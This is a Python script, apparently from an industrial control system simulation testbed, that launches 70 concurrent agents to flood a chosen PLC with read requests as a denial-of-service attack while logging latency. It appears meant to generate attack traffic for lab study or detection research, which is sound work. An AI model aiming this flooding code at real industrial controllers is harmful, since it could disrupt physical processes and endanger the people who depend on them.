import argparse
import logging
import os
import random

from time import sleep
from ics_sim.Device import HMI, Runnable
from Configs import TAG, Controllers


class DDosAgent(HMI):
    max = 0

    def __init__(self, name, target_ip, shared_logger):

        # initialize members
        self.__shared_logger = shared_logger
        super().__init__(name, TAG.TAG_LIST, Controllers.PLCs, 1)
        self.__target_ip = target_ip

        # select target signal for attack based on input target_ip
        target_plc = [plc_id for plc_id, plc_data in Controllers.PLCs.items() if plc_data["ip"] == target_ip]
        possible_signals = [tag_name for tag_name, tag_data in TAG.TAG_LIST.items() if tag_data["plc"] in target_plc]
        self.__target = random.choice(possible_signals)

        # set counter and chuck size
        self.__counter = 0
        self.chunk = 10

    def _before_start(self):
        self._set_clear_scr(False)
        sleep(5)
        self.report(f'selected target = {self.__target}', level=logging.INFO)

    def _logic(self):
        try:
            for index_counter in range(self.chunk):
                value = self._receive(self.__target)
            self.__counter += self.chunk

        except Exception as e:
            self.report(f'get exception on {self.name()} while sending read requests {self.__counter}. (error = {e})',
                        logging.INFO)

    def _post_logic_update(self):
        latency = self.get_logic_execution_time() / self.chunk
        if latency > DDosAgent.max:
            DDosAgent.max = latency
            # self.report('Max seen latency reached to {}'.format(DDosAgent.max), logging.INFO)
        if self.__counter % 1000 < self.chunk:
            self.report('{} sent {} read request for {} '.format(self.name(), self.__counter, self.__target, ),
                        logging.INFO)

    def _initialize_logger(self):
        self._logger = self.__shared_logger

    def _before_stop(self):
        self.report(f'sent {self.__counter} massages before stop max latency is {DDosAgent.max}')

    @staticmethod
    def get_args():
        parser = argparse.ArgumentParser(description='PCAP reader')

        parser.add_argument('name_prefix', metavar='Name prefix of agent',
                            help='This name prefix will be part of agent name!')

        parser.add_argument('--target', metavar='IP of PLC',
                            help='IP of PLC which is target of attack!', default='192.168.0.11',
                            required=True)

        parser.add_argument('--log_path', metavar='Log file',
                            help='the file to write logs!', default='./logs/attack-logs/log-ddos.log',
                            required=True)

        parser.add_argument('--timeout', metavar='timeout for attack', type=float, default=60,
                            help='interval to apply attack', required=False)

        return parser.parse_args()


if __name__ == '__main__':
    args = DDosAgent.get_args()

    directory, filename = os.path.split(args.log_path)
    filename, extension = os.path.splitext(filename)
    logger = Runnable.setup_logger(
        filename,
        logging.Formatter('%(asctime)s %(levelname)s %(message)s'),
        file_dir=directory,
        file_ext='.txt',
        write_mode='a',
        level=logging.INFO
    )

    attackers_count = 70

    attacker_list = []
    for i in range(attackers_count):
        attacker_list.append(
            DDosAgent(name=f'DDoS_Agent_{args.name_prefix}_{i}', target_ip=args.target, shared_logger=logger))

    for attacker in attacker_list:
        attacker.start()

    sleep(args.timeout)

    for attacker in attacker_list:
        attacker.stop()
